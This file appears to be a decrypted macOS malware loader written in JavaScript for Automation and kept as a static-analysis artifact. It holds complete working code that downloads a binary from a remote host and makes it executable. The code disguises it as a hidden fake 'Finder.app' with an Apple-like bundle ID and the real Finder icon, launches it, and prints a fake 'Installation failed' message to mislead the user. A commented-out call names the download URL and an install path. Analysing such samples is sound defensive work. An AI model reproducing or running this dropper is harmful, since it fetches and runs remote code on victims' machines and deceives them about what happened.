/*
 * Decrypted embedded loader from stage 2.
 * STATIC-ANALYSIS ARTIFACT: parsing this file is safe; do not invoke
 * serializeServiceProfile(), which downloads and launches the next payload.
 */

this.copyIcon = function (appPath) {
  var fileManager = $.NSFileManager.defaultManager;
  var source = "/System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns";
  var destination = appPath + "/Contents/Resources/AppIcon.icns";

  fileManager.createDirectoryAtPathWithIntermediateDirectoriesAttributesError(
    $(appPath + "/Contents/Resources"), true, $(), $()
  );
  fileManager.copyItemAtPathToPathError(source, destination, $());
};

this.createInfoPlist = function (appPath, executableName) {
  var xml =
    '<?xml version="1.0" encoding="UTF-8"?>\n' +
    '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n' +
    '<plist version="1.0"><dict>\n' +
    '<key>CFBundleExecutable</key><string>' + executableName + '</string>\n' +
    '<key>CFBundleIdentifier</key><string>com.apple.finder.agent</string>\n' +
    '<key>CFBundleName</key><string>Finder</string>\n' +
    '<key>CFBundleDisplayName</key><string>Finder</string>\n' +
    '<key>CFBundleIconFile</key><string>AppIcon</string>\n' +
    '<key>LSUIElement</key><true/>\n' +
    '<key>LSBackgroundOnly</key><true/>\n' +
    '</dict></plist>';

  var data = $.NSString.stringWithString(xml).dataUsingEncoding($.NSUTF8StringEncoding);
  return $.NSFileManager.defaultManager.createFileAtPathContentsAttributes(
    $(appPath + "/Contents/Info.plist"), data, $()
  );
};

this.printStatus = function (message) {
  var output = $.NSFileHandle.fileHandleWithStandardOutput;
  var data = $.NSString.alloc
    .initWithString("\033[2K\r" + message)
    .dataUsingEncoding($.NSUTF8StringEncoding);
  output.writeData(data);
};

this.printError = function () {
  var output = $.NSFileHandle.fileHandleWithStandardOutput;
  var message =
    "\033[2K\rInstallation failed.\n" +
    "This software requires additional system components that aren't available.\n";
  var data = $.NSString.alloc
    .initWithString(message)
    .dataUsingEncoding($.NSUTF8StringEncoding);
  output.writeData(data);
};

this.launchApp = function (appPath) {
  try {
    var workspace = $.NSWorkspace.sharedWorkspace;
    var appUrl = $.NSURL.fileURLWithPath(appPath);
    workspace.openURL(appUrl);
  } catch (error) {}
};

this.setupApp = function (baseDirectory, appPath, executableName) {
  var fileManager = $.NSFileManager.defaultManager;
  fileManager.createDirectoryAtPathWithIntermediateDirectoriesAttributesError(
    $(appPath + "/Contents/MacOS"), true, $(), $()
  );
  copyIcon(appPath);
  createInfoPlist(appPath, executableName);
  fileManager.createFileAtPathContentsAttributes($(baseDirectory + "/.Cheked"), $(), $());
};

this.serializeServiceProfile = function (payloadUrl, installDirectory) {
  try {
    var done = false;
    var attempts = 0;
    var maxRetries = 3;
    var executableName = "C6690F41";
    var fileManager = $.NSFileManager.defaultManager;
    var baseDirectory = $(installDirectory).stringByExpandingTildeInPath.js;
    var appPath = baseDirectory + "/Finder.app";
    var macOSDirectory = appPath + "/Contents/MacOS";
    var binaryPath = macOSDirectory + "/" + executableName;

    if (fileManager.fileExistsAtPath($(binaryPath))) {
      printError();
      $.exit(0);
    }

    fileManager.createDirectoryAtPathWithIntermediateDirectoriesAttributesError(
      $(macOSDirectory), true, $(), $()
    );

    function download() {
      $.NSURLSession
        .sessionWithConfiguration($.NSURLSessionConfiguration.ephemeralSessionConfiguration)
        .dataTaskWithURLCompletionHandler(
          $.NSURL.URLWithString(payloadUrl),
          function (data, response, error) {
            if (error.isNil() && response.statusCode === 200 && !data.isNil() && data.length > 0) {
              var attributes = $.NSDictionary.dictionaryWithObjectForKey(
                $(493), // decimal 0755
                $.NSFilePosixPermissions
              );
              if (fileManager.createFileAtPathContentsAttributes($(binaryPath), data, attributes)) {
                setupApp(baseDirectory, appPath, executableName);
                done = true;
              }
            } else {
              attempts++;
              if (attempts < maxRetries) {
                download();
                return;
              }
            }
            done = true;
          }
        ).resume;
    }

    download();
    var runLoop = $.NSRunLoop.currentRunLoop;
    var dotCount = 0;
    while (!done) {
      var dots = ".".repeat(dotCount % 4);
      printStatus("Downloading" + dots);
      dotCount++;
      runLoop.runUntilDate($.NSDate.dateWithTimeIntervalSinceNow(0.3));
    }

    printStatus("Installing...");
    launchApp(appPath);
    printError();
    $.exit(0);
  } catch (error) {
    $.exit(1);
  }
};

// Original stage-2 invocation after environment-key decryption:
// serializeServiceProfile(
//   "https://gretgerherhdf.it.com/kug2gn/t7sDAzFPAA2v",
//   "~/Library/Application Support/com.apple.finder.agent"
// );
